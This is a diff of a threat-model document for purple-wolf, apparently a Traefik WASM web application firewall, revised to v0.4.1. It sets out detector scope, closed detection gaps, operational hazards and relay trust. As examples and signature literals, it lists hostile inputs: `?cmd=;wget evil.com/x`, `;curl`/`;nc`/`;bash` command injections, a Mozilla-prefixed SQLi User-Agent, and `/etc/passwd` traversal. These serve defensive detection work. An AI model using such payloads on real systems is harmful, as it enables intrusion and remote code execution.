@@ -1,4 +1,4 @@
-# Threat Model — purple-wolf v0.2
+# Threat Model - purple-wolf v0.4.1
 
 This document is the source of truth for what purple-wolf is and is not
 designed to protect against. Adopters should read it before deploying;
@@ -6,7 +6,7 @@ auditors should diff it against any future PR that changes detector
 behavior.
 
 The model is intentionally narrow. A WAF that promises more than it
-delivers is worse than no WAF — operators wire their alerting around
+delivers is worse than no WAF - operators wire their alerting around
 the promise and discover the gap during an incident.
 
 ---
@@ -17,7 +17,7 @@ the promise and discover the gap during an incident.
    public internet
         │
    ┌────▼────┐
-   │ trusted │  (your CDN / ALB / Cloudflare / etc. — operator-owned)
+   │ trusted │  (your CDN / ALB / Cloudflare / etc. - operator-owned)
    │  edge   │
    └────┬────┘
         │
@@ -38,7 +38,7 @@ the promise and discover the gap during an incident.
 The plugin runs inside Traefik's wazero sandbox. From the engine's
 perspective:
 
-- **Untrusted:** every byte of the HTTP request — method, URI, every
+- **Untrusted:** every byte of the HTTP request - method, URI, every
   header value, body up to `body.maxInspectBytes`. We assume an
   attacker controls all of these.
 - **Trusted-by-config:** the `X-Forwarded-For` chain. By default the
@@ -56,7 +56,7 @@ perspective:
 
 ---
 
-## 2. In scope (what purple-wolf v0.2 is designed to catch)
+## 2. In scope (what purple-wolf v0.4.1 is designed to catch)
 
 | Attack class | Detector | Notes |
 |---|---|---|
@@ -67,9 +67,9 @@ perspective:
 | XSS in request body | `injection` | |
 | XSS in allow-listed headers | `injection` | |
 | Path traversal (`../`, `..\\`, `....//`, `/etc/passwd`) | `signatures` | Literal aho-corasick |
-| RCE primitives (`$(`, `` ` ``, `/bin/sh`) | `signatures` | Literal — narrow |
+| RCE primitives (`$(`, `` ` ``, `/bin/sh`, `;wget`, `;curl`) | `signatures` | Literal, narrow |
 | Scanner User-Agents (sqlmap, nikto, nuclei) | `signatures` | Case-insensitive |
-| Method allow-list (anything outside GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS) | `structural` | Defense in depth — Traefik usually rejects upstream |
+| Method allow-list (anything outside GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS) | `structural` | Defense in depth - Traefik usually rejects upstream |
 | Oversized header size / count | `structural` | 16 KiB / 100 headers |
 | Per-IP rate limiting | `reputation` | Bounded LRU token bucket |
 | Per-IP deny list | `reputation` | Operator-supplied list |
@@ -85,11 +85,11 @@ perspective:
   routing and TLS is terminated.
 - **Cluster-wide shared rate-limit state.** Rate-limit state lives in
   WASM linear memory per plugin instance per Traefik pod; effective
-  cluster rate is `configured × pod_count`. A shared-state backend
-  (Redis-backed governor) is a v0.3+ feature.
+  cluster rate is `configured × pod_count`. A shared-state backend is
+  not shipped in v0.4.1.
 - **Streaming body inspection.** The plugin reads up to
   `body.maxInspectBytes` (default 1 MiB) into WASM memory. Larger
-  bodies are either passed (`overCap: pass`, the default — see §4.2)
+  bodies are either passed (`overCap: pass`, the default - see §4.2)
   or blocked (`overCap: block`). True streaming requires a different
   http-wasm host capability we don't have.
 - **Stateful detection across requests.** Each request is inspected
@@ -118,7 +118,7 @@ perspective:
 - **Log4Shell-style RCE (`${jndi:...}`).** No specific signature.
   Future work.
 - **CRLF injection / HTTP request smuggling.** Mostly out of the
-  plugin's hands — Traefik filters CRLF before the plugin sees the
+  plugin's hands - Traefik filters CRLF before the plugin sees the
   request, and HTTP/2 doesn't carry CRLF at all. The plugin won't
   detect a smuggling attempt that already made it past Traefik.
 - **Tenant-customizable signature lists.** The signature table in
@@ -126,34 +126,25 @@ perspective:
   compile-time. A tenant cannot add a custom literal without forking
   and recompiling. Future work.
 
-### 3.2.1 Empirically observed detection gaps (round-2 benchmark)
+### 3.2.1 Empirically observed detection gaps closed since round 2
 
-These are *specific* gaps surfaced by the live-stack benchmark in
-[`docs/benchmark.md`](docs/benchmark.md). They are consistent with
-the detector design (libinjection precision-over-recall + literal
-aho-corasick signatures); calling them out so operators don't have
-to discover them from production incidents.
+The round-2 live-stack benchmark in [`docs/benchmark.md`](docs/benchmark.md)
+surfaced two concrete misses: User-Agent SQLi with a browser-like
+`Mozilla/` prefix and bare shell-command query payloads such as
+`?cmd=;wget evil.com/x`. Both are closed in v0.4+:
 
-- **User-Agent SQLi with a `Mozilla/` prefix is not blocked.** A
-  payload like `User-Agent: Mozilla/5.0 1 OR 1=1` passes. libinjection
-  treats Mozilla-prefixed strings as user-agent content rather than a
-  SQL expression context; signatures only match scanner-UA literals
-  (sqlmap, nikto, etc.) and don't have a generic SQL-in-UA rule.
-  *Operator workaround*: add custom UA signatures upstream of the
-  WAF, or rely on backend validation of any field populated from the
-  User-Agent header. *Coverage as of round 2:* missed.
+- **User-Agent SQLi with a `Mozilla/` prefix.** The injection detector
+  now re-probes the User-Agent suffix with libinjection after removing
+  the browser-shaped prefix token, so `User-Agent: Mozilla/5.0 1 OR
+  1=1` is inspected as an isolated SQL tail instead of a complete UA
+  string.
 - **Bare shell-command primitives in query strings (`;wget`, `;curl`,
-  `;nc`) are not blocked.** `$(whoami)` and `/bin/sh` are blocked
-  by the signatures group, but `?cmd=;wget evil.com/x` is not —
-  there's no literal signature for `;<cmd>` patterns. *Operator
-  workaround*: add `;wget`, `;curl`, `;nc`, `;bash` to a custom
-  signature set (compile-time today; future work for runtime
-  configurability). *Coverage as of round 2:* missed.
+  `;nc`, `;bash`).** The signature table now includes collision-aware
+  `rce_cmd` literals for those query forms.
 
-Both gaps are consistent with the documented
-"precision-over-recall, atomic-token tests deliberately not
-flagged" stance — surfaced explicitly here so adopters don't infer
-coverage that isn't there.
+The benchmark numbers have not yet been rerun after these fixes. Treat
+the published benchmark as historical live-stack evidence plus current
+code-level fixes, not as fresh v0.4.1 benchmark evidence.
 
 ### 3.3 Non-goals at the integrity level
 
@@ -170,7 +161,7 @@ coverage that isn't there.
 
 ## 4. Known operational hazards
 
-These are not "bugs" — they are documented behaviors a careful
+These are not "bugs" - they are documented behaviors a careful
 operator should understand.
 
 ### 4.1 Self-DoS via misconfigured `xff.trustedHops`
@@ -180,7 +171,7 @@ count, attackers can spoof the leftmost XFF entry and:
 - pin the per-IP rate-limit budget for an arbitrary IP (impersonation
   DoS against a victim); or
 - rotate spoofed IPs to inflate the rate-limit map's memory footprint
-  (bounded at `reputation.maxTrackedIps`, default 50,000 — bounded
+  (bounded at `reputation.maxTrackedIps`, default 50,000 - bounded
   DoS but real load).
 
 **Mitigation:** default `xff.trustedHops` is `0` (use TCP peer, ignore
@@ -197,7 +188,7 @@ inspection still run). Attackers who learn this and prepend 1 MiB of
 padding can defeat body-only payload detection.
 
 **Mitigation:** raise `maxInspectBytes` (memory cost) or switch to
-`overCap: block` (correctness cost — any legitimate large upload
+`overCap: block` (correctness cost - any legitimate large upload
 returns 403).
 
 ### 4.3 Fail-open paths, and the panic/trap reality
@@ -209,16 +200,16 @@ Paths that bypass detection without blocking:
 - An over-cap body with `overCap: pass`. As of the robustness pass the
   buffered prefix (the first `maxInspectBytes`) is now inspected and the
   audit log carries `body_truncated: true`, so this is no longer a free
-  bypass (the payload must sit *past* the cap) and it is now visible — but
+  bypass (the payload must sit *past* the cap) and it is now visible - but
   bytes beyond the cap still go un-inspected. See §4.2.
 
-**Panic handling — important correction.** Earlier docs claimed a detector
+**Panic handling - important correction.** Earlier docs claimed a detector
 panic is "caught by `catch_unwind` and `failMode` is applied." That is
 **false on the shipped guest.** The `wasm32-wasip1` target is
 `panic = "abort"` on stable Rust: unwinding does not exist there, so the
 `catch_unwind` in `crates/purple-wolf-traefik/src/entry.rs` cannot intercept
 a panic. A genuine panic *traps the whole Wasm instance*, and Traefik applies
-its own plugin-failure path (a 5xx) — which means a panic does **not** honor
+its own plugin-failure path (a 5xx) - which means a panic does **not** honor
 `failMode` and a `failOpen` deployment effectively fails *closed* on a
 panic-inducing input.
 
@@ -249,27 +240,27 @@ preserves the rest, so no detection is lost.
 
 ## 5. What to monitor in production
 
-- `action: "block"` count, per `blocked_rule` — your true positives + FPs.
-- `action: "allow"` count with non-empty `would_block_rules` — monitor-mode
+- `action: "block"` count, per `blocked_rule` - your true positives + FPs.
+- `action: "allow"` count with non-empty `would_block_rules` - monitor-mode
   signal; use to tune before flipping to enforce.
 - Plugin failure rate from Traefik's metrics
-  (`traefik_middleware_request_total{code="500"}`) — should be near zero.
+  (`traefik_middleware_request_total{code="500"}`) - should be near zero.
   Because `wasm32-wasip1` is `panic = "abort"` (§4.3), a spike here means
   detector panics are *trapping the guest* (not being caught), so requests
   are failing closed regardless of `failMode`. Treat any sustained 5xx from
   the middleware as a correctness bug to fix, not steady-state behavior.
-- `source_ip` cardinality from the audit log — sudden growth into the
+- `source_ip` cardinality from the audit log - sudden growth into the
   cap (50k entries by default) indicates IP-rotation DoS attempts.
-- `body.overCap` 403s — see §4.2.
-- `pwrelay_deliveries_total{outcome="dlq"}` — see §7.
-- `pwrelay_deliveries_total{outcome="dropped_queue_full"}` — sustained
+- `body.overCap` 403s - see §4.2.
+- `pwrelay_deliveries_total{outcome="dlq"}` - see §7.
+- `pwrelay_deliveries_total{outcome="dropped_queue_full"}` - sustained
   growth means a subscriber is consistently slower than event arrival
   rate; raise that subscriber's `subscriber_queue` or reduce its
   filter scope.
 
 ---
 
-## 7. Webhook delivery (v0.3+ purple-wolf-relay)
+## 7. Webhook delivery (purple-wolf-relay)
 
 The relay is a *separate* process that sits outside the WAF's trust
 boundary. It tails Traefik's stdout, parses the purple-wolf audit JSON,
@@ -278,14 +269,14 @@ The protocol contract lives in [`docs/webhook-protocol.md`](docs/webhook-protoco
 
 ### 7.1 Trust model
 
-- The relay has **no inbound trust** from subscribers — it only sends.
+- The relay has **no inbound trust** from subscribers - it only sends.
   Subscribers expose an HTTP endpoint; the relay never accepts
   webhooks back. The admin surface is intended for cluster-internal
   scrape only. Optional bearer auth can protect `/metrics` and
   `/version`; `/healthz` and `/readyz` stay unauthenticated so
   orchestrator probes continue to work.
 - Each subscriber is identified by a shared HMAC secret. The relay
-  references secrets via `secret_env` or `secret_file` — they must
+  references secrets via `secret_env` or `secret_file` - they must
   not be inlined in YAML. Secrets are held in
   `zeroize::Zeroizing<Vec<u8>>` and wiped on drop.
 - The relay is **best-effort, at-least-once.** Subscribers MUST
